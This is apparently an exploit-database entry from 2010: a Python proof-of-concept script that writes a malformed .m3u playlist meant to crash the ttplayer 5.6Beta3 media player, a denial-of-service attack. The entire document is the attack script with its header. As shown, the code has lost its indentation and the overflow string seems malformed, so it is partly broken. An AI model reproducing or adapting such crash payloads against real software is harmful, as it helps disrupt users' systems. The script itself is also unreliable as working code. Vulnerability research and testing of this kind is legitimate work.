# Exploit Title: ttplayer=5.6Beta3 Dos POC
# Date: 2010-01-06
# Author: t-bag YDteam.
# Software Link: http://ttplayer.qianqian.com
# Version: 5.6Beta3
# Tested on: win7 and win2003

# Code :
#!/usr/bin/python
#f# t-bag
crash = ("#ETM3U\n"+'QQ\\1.'+"x41" * 81)
try:
file = open('1.m3u','w');
file.write(crash);
file.close();
print "[+] Created crash qianqian file ~"
except:
print "[-] Error :(";